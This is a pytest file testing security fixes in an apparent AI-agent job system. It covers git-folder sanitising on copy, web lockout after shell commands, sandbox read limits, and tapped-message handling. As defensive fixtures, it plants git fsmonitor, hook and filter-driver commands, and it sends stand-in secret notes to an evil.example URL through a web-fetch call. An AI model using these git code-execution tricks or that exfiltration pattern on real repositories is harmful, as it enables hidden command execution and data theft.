"""Simpler Workers, pass 3: the independent review's findings, each as the safe outcome.
  C1: a kept copy never carries git that runs a command (any case, a pointer, an embedded git folder, nested);
  H1: a job with a named folder: once any command ran, the web is closed for the run, however the folder was named;
  H2: a job's sandbox reads no data under Homebrew's var and etc, nor his own scripts in ~/.local/bin;
  M1: a tapped button's words are never "his typed words" (brief, named folders, where to keep it);
  L1-L3: a pipe never blocks a keep; Keep and Retry never overlap and a double tap copies once; a single kept file
  goes into a folder of its own.
Everything here is a stand-in under tmp; git runs with no settings of anyone's."""
from __future__ import annotations

import os
import shutil
import subprocess
import threading
import time
from pathlib import Path

import httpx
import pytest

from odie.workers import keep as job_keep
from odie.workers import router, sandbox, worker
from odie.workers import store as jobs
from tests.test_workers import Ctx, Scripted, Tool, a_job, world  # noqa: F401 (fixtures)
from tests.test_workers_simple import finished, home  # noqa: F401 (fixtures)

needs_git = pytest.mark.skipif(shutil.which("git") is None, reason="no git here")
needs_sandbox = pytest.mark.skipif(not sandbox.available(), reason="no sandbox-exec on this computer")


# ── C1: git that runs a command never comes along ───────────────────────────

def git_env(tmp_path: Path) -> dict:
    home = tmp_path / "git-home"
    home.mkdir(exist_ok=True)
    return {"PATH": os.environ.get("PATH", "/usr/bin:/bin"), "HOME": str(home), "GIT_CONFIG_GLOBAL": "/dev/null",
            "GIT_CONFIG_NOSYSTEM": "1", "GIT_TERMINAL_PROMPT": "0"}


def git(tmp_path: Path, cwd: Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(["git", *args], cwd=cwd, env=git_env(tmp_path), capture_output=True, text=True, timeout=30)


def a_repo(tmp_path: Path, where: Path) -> None:
    where.mkdir(parents=True)
    git(tmp_path, where, "init", "-q")
    (where / "README").write_text("hi\n")
    git(tmp_path, where, "add", "README")
    git(tmp_path, where, "-c", "user.name=x", "-c", "user.email=x@example.com", "commit", "-qm", "one")


def fsmonitor(marker: Path) -> str:
    return f'\tfsmonitor = "touch {marker}; false"\n'


def keep_and_use(tmp_path: Path, job: Path, after: list[str], in_sub: str = "") -> Path:
    dest = tmp_path / "demos"
    dest.mkdir(exist_ok=True)
    kept = job_keep.copy_into(job_keep.source_in(job, "app"), dest)
    where = kept.path / in_sub if in_sub else kept.path
    git(tmp_path, where, *after)
    return kept.path


@needs_git
def test_a_git_folder_in_another_case_carries_no_settings(tmp_path):
    job = tmp_path / "job"
    a_repo(tmp_path, job / "app")
    (job / "app" / ".git").rename(job / "app" / ".GIT")
    marker = tmp_path / "PWNED_A"
    with open(job / "app" / ".GIT" / "config", "a") as f:
        f.write(fsmonitor(marker))
    keep_and_use(tmp_path, job, ["status"])
    assert not marker.exists()


@needs_git
def test_hooks_in_another_case_stay_behind(tmp_path):
    job = tmp_path / "job"
    a_repo(tmp_path, job / "app")
    marker = tmp_path / "PWNED_B"
    hooks = job / "app" / ".git" / "hooks"
    hooks.rename(job / "app" / ".git" / "Hooks")
    hook = job / "app" / ".git" / "Hooks" / "pre-commit"
    hook.write_text(f"#!/bin/sh\ntouch {marker}\n")
    hook.chmod(0o755)
    kept = keep_and_use(tmp_path, job, ["-c", "user.name=x", "-c", "user.email=x@example.com", "commit", "-q",
                                        "--allow-empty", "-m", "two"])
    assert not marker.exists()
    assert not any(p.name.casefold() == "hooks" for p in (kept / ".git").iterdir())


@needs_git
def test_a_commondir_pointing_at_another_git_folder_stays_behind(tmp_path):
    job = tmp_path / "job"
    a_repo(tmp_path, job / "app")
    marker = tmp_path / "PWNED_C"
    shutil.copytree(job / "app" / ".git", job / "app" / "evilgit")
    with open(job / "app" / "evilgit" / "config", "a") as f:
        f.write(fsmonitor(marker))
    (job / "app" / ".git" / "commondir").write_text("../evilgit\n")
    kept = keep_and_use(tmp_path, job, ["status"])
    assert not marker.exists()
    assert not (kept / ".git" / "commondir").exists()


@needs_git
def test_an_embedded_git_folder_gets_no_settings_of_its_own(tmp_path):
    job = tmp_path / "job"
    a_repo(tmp_path, job / "app")
    marker = tmp_path / "PWNED_D"
    git(tmp_path, job / "app", "init", "-q", "--bare", "docs")
    (job / "app" / "docs" / "config").write_text("[core]\n\tbare = false\n\tworktree = ..\n" + fsmonitor(marker))
    keep_and_use(tmp_path, job, ["status"], in_sub="docs")
    assert not marker.exists()


@needs_git
def test_a_nested_repo_in_a_subfolder_is_cleaned_too(tmp_path):
    job = tmp_path / "job"
    a_repo(tmp_path, job / "app")
    a_repo(tmp_path, job / "app" / "vendor" / "lib")
    marker = tmp_path / "PWNED_E"
    with open(job / "app" / "vendor" / "lib" / ".git" / "config", "a") as f:
        f.write(fsmonitor(marker))
    keep_and_use(tmp_path, job, ["status"], in_sub="vendor/lib")
    assert not marker.exists()


@needs_git
def test_a_filter_driver_planted_in_settings_never_runs(tmp_path):
    job = tmp_path / "job"
    a_repo(tmp_path, job / "app")
    marker = tmp_path / "PWNED_F"
    (job / "app" / ".gitattributes").write_text("* filter=evil diff=evil\n")
    with open(job / "app" / ".git" / "config", "a") as f:
        f.write(f'[filter "evil"]\n\tclean = "touch {marker}; cat"\n\tsmudge = "touch {marker}; cat"\n'
                f'[diff "evil"]\n\ttextconv = "touch {marker}; cat"\n')
    kept = keep_and_use(tmp_path, job, ["status"])
    (kept / "README").write_text("changed\n")
    git(tmp_path, kept, "add", "README")
    git(tmp_path, kept, "diff", "--cached")
    assert not marker.exists()  # the drivers need settings the fresh file doesn't have


def test_borrowed_objects_in_any_case_stay_behind(tmp_path):
    job = tmp_path / "job"
    info = job / "app" / ".git" / "ObJeCtS" / "Info"
    info.mkdir(parents=True)
    (job / "app" / ".git" / "HEAD").write_text("ref: refs/heads/main\n")
    (info / "Alternates").write_text("/somewhere/else/objects\n")
    (info / "HTTP-Alternates").write_text("https://example.com/objects\n")
    (info / "packs").write_text("P pack-1.pack\n")
    dest = tmp_path / "demos"
    dest.mkdir()
    kept = job_keep.copy_into(job_keep.source_in(job, "app"), dest)
    names = sorted(p.name for p in (kept.path / ".git" / "ObJeCtS" / "Info").iterdir())
    assert names == ["packs"]


def test_a_git_folder_keeps_only_what_git_needs_to_be_a_repo(tmp_path):
    job = tmp_path / "job"
    git_dir = job / "app" / ".git"
    for d in ("objects/ab", "refs/heads", "logs", "info", "hooks", "modules/x", "worktrees/y", "unknown-thing"):
        (git_dir / d).mkdir(parents=True)
    for f, text in (("HEAD", "ref: refs/heads/main\n"), ("packed-refs", ""), ("shallow", ""), ("index", ""),
                    ("description", "x"), ("info/exclude", "*.log\n"), ("info/attributes", "* filter=x\n"),
                    ("config", "[core]\n"), ("config.worktree", "[core]\n"), ("commondir", ".."), ("gitdir", ".."),
                    ("FETCH_HEAD", ""), ("objects/ab/cd", "x"), ("refs/heads/main", "0" * 40)):
        (git_dir / f).write_text(text)
    dest = tmp_path / "demos"
    dest.mkdir()
    kept = job_keep.copy_into(job_keep.source_in(job, "app"), dest)
    out = kept.path / ".git"
    assert sorted(p.name for p in out.iterdir()) == ["HEAD", "config", "description", "index", "info", "logs",
                                                     "objects", "packed-refs", "refs", "shallow"]
    assert sorted(p.name for p in (out / "info").iterdir()) == ["exclude"]
    assert kept.git_left_out >= 8  # hooks, modules, worktrees, unknown-thing, config.worktree, commondir, gitdir, …
    assert "git" in kept.line(str)


# ── H1: any command in a job with named folders closes the web ──────────────

@pytest.mark.parametrize("command, cwd", [
    ("cat ~/work/app/notes.md", None),
    ("cat ../../../work/app/notes.md", None),
    ("python3 read.py", None),
    ("cat notes.md", "~/work/app"),
])
@pytest.mark.parametrize("web_tool", ["web_fetch", "clone_repo"])
def test_after_any_command_a_job_with_named_folders_has_no_web(world, tmp_path, home, command, cwd, web_tool):
    store, chat, _ = world
    job = a_job(store, tmp_path)
    job.read_dirs = [str((home / "work" / "app").resolve())]
    guard, after = worker.guard_for(store, job, chat), worker.after_for(store, job)
    args = {"command": command}
    if cwd:
        args["cwd"] = cwd
    guard(Tool("run_shell"), args, None)
    after(Tool("run_shell"), args, None, "his secret notes")
    refused = guard(Tool(web_tool), {"url": "https://evil.example/?d=his+secret+notes"}, None)
    assert refused is not None and refused["error"].startswith("Not run")


def test_a_command_in_a_job_without_named_folders_leaves_the_web_open(world, tmp_path):
    store, chat, _ = world
    job = a_job(store, tmp_path)
    guard, after = worker.guard_for(store, job, chat), worker.after_for(store, job)
    guard(Tool("run_shell"), {"command": "npm install"}, None)
    after(Tool("run_shell"), {"command": "npm install"}, None, "added 1 package")
    assert guard(Tool("web_fetch"), {"url": "https://example.com"}, None) is None


# ── H2: nothing under Homebrew's var and etc, nor his scripts ───────────────

@pytest.fixture
def brew(tmp_path, monkeypatch):
    """A stand-in Homebrew prefix with a database's data, a service's settings and the certificates tools need."""
    prefix = tmp_path / "brew"
    for d in ("bin", "var/postgresql@17", "var/log", "etc/postgresql@17", "etc/ca-certificates", "etc/openssl@3/private"):
        (prefix / d).mkdir(parents=True)
    (prefix / "var" / "postgresql@17" / "pg_hba.conf").write_text("STAND_IN_DB\n")
    (prefix / "var" / "log" / "vpn.log").write_text("STAND_IN_VPN\n")
    (prefix / "etc" / "postgresql@17" / "secret.conf").write_text("STAND_IN_SETTINGS\n")
    (prefix / "etc" / "ca-certificates" / "cert.pem").write_text("CERTS_OK\n")
    (prefix / "etc" / "openssl@3" / "cert.pem").write_text("OPENSSL_OK\n")
    (prefix / "etc" / "openssl@3" / "private" / "key.pem").write_text("STAND_IN_KEY\n")
    (prefix / "etc" / "gitconfig").write_text("GITCONFIG_OK\n")
    (prefix / "bin" / "tool").write_text("TOOL_OK\n")
    monkeypatch.setattr(sandbox, "BREW_PREFIXES", (str(prefix.resolve()),))
    return prefix.resolve()


def sh(job: Path, script: str, home: Path, network: str = sandbox.NONE) -> str:
    argv = sandbox.command(["/bin/sh", "-c", script], job, network=network, home=home)
    done = subprocess.run(argv, cwd=job, env=sandbox.env(job), capture_output=True, text=True, timeout=60)
    return done.stdout + done.stderr


@needs_sandbox
@pytest.mark.parametrize("network", [sandbox.NONE, sandbox.INTERNET])
def test_homebrews_data_and_service_settings_are_unreadable_its_tools_and_certificates_are(tmp_path, brew, network):
    job = tmp_path / "jobs" / "j"
    job.mkdir(parents=True)
    out = sh(job, f"cat {brew}/var/postgresql@17/pg_hba.conf {brew}/var/log/vpn.log {brew}/etc/postgresql@17/secret.conf "
                  f"{brew}/etc/openssl@3/private/key.pem; cat {brew}/etc/ca-certificates/cert.pem "
                  f"{brew}/etc/openssl@3/cert.pem {brew}/etc/gitconfig {brew}/bin/tool", tmp_path / "home", network)
    for secret in ("STAND_IN_DB", "STAND_IN_VPN", "STAND_IN_SETTINGS", "STAND_IN_KEY"):
        assert secret not in out
    for needed in ("CERTS_OK", "OPENSSL_OK", "GITCONFIG_OK", "TOOL_OK"):
        assert needed in out


@needs_sandbox
def test_only_uv_and_links_to_system_tools_are_readable_in_local_bin(tmp_path):
    home = tmp_path / "home"
    local_bin = home / ".local" / "bin"
    local_bin.mkdir(parents=True)
    (local_bin / "uv").write_text("#!/bin/sh\necho UV_RAN\n")
    (local_bin / "uv").chmod(0o755)
    (local_bin / "my-script").write_text("STAND_IN_SCRIPT\n")
    (local_bin / "node").symlink_to("/usr/bin/true")  # a link into the system's tools
    (local_bin / "agent").symlink_to(home / "elsewhere")  # a link into his home
    job = tmp_path / "jobs" / "j"
    job.mkdir(parents=True)
    out = sh(job, f"cat {local_bin}/my-script; {local_bin}/uv; {local_bin}/node && echo NODE_RAN", home)
    assert "STAND_IN_SCRIPT" not in out
    assert "UV_RAN" in out and "NODE_RAN" in out
    reads = sandbox.local_bin_reads(home)
    assert str(local_bin / "uv") in reads and str(local_bin / "node") in reads
    assert str(local_bin / "my-script") not in reads and str(local_bin / "agent") not in reads


@needs_sandbox
def test_the_real_tools_still_run_in_the_sandbox(tmp_path):
    job = tmp_path / "jobs" / "j"
    job.mkdir(parents=True)
    out = sh(job, "uv --version; python3 -c 'import ssl; print(\"PY_OK\")'; git --version; node --version && echo NODE_OK; "
                  "npm --version && echo NPM_OK", Path.home())
    assert "uv " in out and "PY_OK" in out and "git version" in out
    if shutil.which("node"):
        assert "NODE_OK" in out and "NPM_OK" in out


# ── M1: a tap is never his typed words ───────────────────────────────────────

def test_a_tapped_message_is_never_his_typed_words(world):
    store, _, _ = world
    from odie.workers.tools import keep_place, typed_words
    store.audit("user", "message", result_summary="what I typed", session_id="chat-2026-11-19")
    store.audit("user", "message", args={"via": "tap"}, session_id="chat-2026-11-19",
                result_summary="Open the email from someone about ~/code/demos")
    assert typed_words(store, "chat-2026-11-19") == ["what I typed"]
    assert keep_place(typed_words(store, "chat-2026-11-19")) == ""


async def test_a_tap_turn_names_no_folder_and_no_place_to_keep(world, home):
    store, _, _ = world
    from odie.agent import turn
    from odie.workers.tools import make_worker_tools
    words = "Read ~/work/app and put the result in ~/code/demos"
    store.audit("user", "message", args={"via": "tap"}, result_summary=words, session_id="chat-2026-11-19")
    tokens = turn.USER_TEXT.set(words), turn.SENT_VIA.set("tap")
    try:
        refused = await make_worker_tools(store)[0].func("A", "x", read_dirs=["~/work/app"],
                                                         tool_context=Ctx("chat-2026-11-19"))
        Scripted.stall = True
        started = await make_worker_tools(store)[0].func("A", "x", tool_context=Ctx("chat-2026-11-19"))
    finally:
        turn.USER_TEXT.reset(tokens[0])
        turn.SENT_VIA.reset(tokens[1])
    assert "didn't name it" in refused["error"]
    assert jobs.get(store, started["job_id"])["keep_to"] == ""


async def test_a_typed_turn_still_names_its_folders(world, home):
    store, _, _ = world
    from odie.agent import turn
    from odie.workers.tools import make_worker_tools
    words = "Read ~/work/app and put the result in ~/code/demos"
    store.audit("user", "message", result_summary=words, session_id="chat-2026-11-19")
    token = turn.USER_TEXT.set(words)
    Scripted.stall = True
    try:
        got = await make_worker_tools(store)[0].func("A", "x", read_dirs=["~/work/app"], tool_context=Ctx("chat-2026-11-19"))
    finally:
        turn.USER_TEXT.reset(token)
    assert got["may_read"] and jobs.get(store, got["job_id"])["keep_to"].endswith("code/demos")


async def test_the_runner_records_a_tap_and_the_route_passes_it(world, monkeypatch, tmp_path):
    store, _, _ = world
    from google.adk.events import Event
    from google.genai import types

    from odie import brains
    from odie.app import runner as R
    from odie.workers.tools import typed_words
    from tests.test_think_per_chat import OPENAI
    monkeypatch.setattr(brains, "resolve_selection", lambda st, slot: OPENAI)
    r = R.OdieRunner(store)

    async def fake_run(**kw):
        yield Event(author="odie", invocation_id="i", content=types.Content(role="model", parts=[types.Part(text="ok")]))
    r.runner.run_async = fake_run
    [e async for e in r.chat("typed", session_id="chat-2026-11-19")]
    [e async for e in r.chat("a button's words", session_id="chat-2026-11-19", via="tap")]
    await r.close()
    assert typed_words(store, "chat-2026-11-19") == ["typed"]
    from odie.app.routes import ChatIn
    assert ChatIn(text="x", via="tap").via == "tap"


# ── L1: a pipe never blocks a keep ───────────────────────────────────────────

def test_a_pipe_as_what_to_keep_is_refused_at_once(tmp_path):
    job = tmp_path / "job"
    job.mkdir()
    os.mkfifo(job / "out")
    dest = tmp_path / "demos"
    dest.mkdir()
    done = []
    t = threading.Thread(target=lambda: done.append(_try_keep(job, "out", dest)), daemon=True)
    t.start()
    t.join(5)
    assert not t.is_alive() and isinstance(done[0], job_keep.KeepRefused)
    assert list(dest.iterdir()) == []


def _try_keep(job, name, dest):
    try:
        return job_keep.copy_into(job_keep.source_in(job, name), dest)
    except job_keep.KeepRefused as e:
        return e


def test_copying_a_file_that_became_a_pipe_refuses_at_once_and_makes_nothing(tmp_path):
    os.mkfifo(tmp_path / "b.txt")  # listed as a file, then swapped for a pipe before the copy opened it
    started = time.monotonic()
    with pytest.raises(job_keep.NotAFile):
        job_keep.copy_file(tmp_path / "b.txt", tmp_path / "copy.txt", create=True)
    assert time.monotonic() - started < 2
    assert not (tmp_path / "copy.txt").exists()


def test_a_pipe_inside_the_tree_is_left_out_and_counted(tmp_path):
    job = tmp_path / "job"
    (job / "app").mkdir(parents=True)
    (job / "app" / "a.txt").write_text("a")
    os.mkfifo(job / "app" / "b.txt")
    dest = tmp_path / "demos"
    dest.mkdir()
    kept = job_keep.copy_into(job_keep.source_in(job, "app"), dest)
    assert (dest / "app" / "a.txt").exists() and not (dest / "app" / "b.txt").exists()
    assert kept.others_left_out == 1


# ── L2: Keep and Retry never overlap; a double tap copies once ───────────────

def test_a_double_tap_copies_once(world, tmp_path, home, monkeypatch):
    store, _, _ = world
    jid, _ = finished(store, tmp_path, keep_to=str((home / "code" / "demos").resolve()))
    real = job_keep.copy_into

    def slow(source, dest_dir, file_folder="kept"):
        time.sleep(0.3)
        return real(source, dest_dir, file_folder)
    monkeypatch.setattr(job_keep, "copy_into", slow)
    results = []

    def tap():
        try:
            results.append(job_keep.keep_job(store, jid))
        except job_keep.KeepRefused as e:
            results.append(e)
    threads = [threading.Thread(target=tap) for _ in range(2)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(10)
    assert sorted(type(r).__name__ for r in results) == ["KeepRefused", "Kept"]
    assert sorted(p.name for p in (home / "code" / "demos").iterdir()) == ["app"]
    assert jobs.kept_of(jobs.get(store, jid))["path"].endswith("/app")  # written before the second tap could look
    with pytest.raises(job_keep.KeepRefused):
        job_keep.keep_job(store, jid)  # a later tap: already kept


async def test_keep_after_a_retry_started_is_refused(world, tmp_path, home):
    store, _, _ = world
    jid, _ = finished(store, tmp_path, keep_to=str((home / "code" / "demos").resolve()))
    Scripted.stall = True
    assert router.retry(jid) is not None
    with pytest.raises(job_keep.KeepRefused):
        job_keep.keep_job(store, jid)
    assert list((home / "code" / "demos").iterdir()) == []


# ── L3: a single kept file goes into a folder of its own ────────────────────

def test_a_single_file_is_kept_in_a_folder_named_after_the_job(tmp_path):
    job = tmp_path / "job"
    job.mkdir()
    (job / "conftest.py").write_text("x = 1\n")
    dest = tmp_path / "demos"
    dest.mkdir()
    kept = job_keep.copy_into(job_keep.source_in(job, "conftest.py"), dest, "try-app")
    assert kept.path == dest / "try-app" / "conftest.py"
    assert not (dest / "conftest.py").exists()
    again = job_keep.copy_into(job_keep.source_in(job, "conftest.py"), dest, "try-app")
    assert again.path == dest / "try-app-2" / "conftest.py"


async def test_the_tap_route_still_answers_where_it_went(world, tmp_path, home):
    store, chat, _ = world
    from odie.app.main import create_app
    from tests.test_api import FakeRunner
    jid, _ = finished(store, tmp_path, keep_to=str((home / "code" / "demos").resolve()))
    app = create_app(runner=FakeRunner(), store=store)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t") as c, \
            app.router.lifespan_context(app):
        router.setup(store, chat)
        r = await c.post(f"/api/jobs/{jid}/keep")
    assert r.status_code == 200 and r.json()["kept"] == "~/code/demos/app"
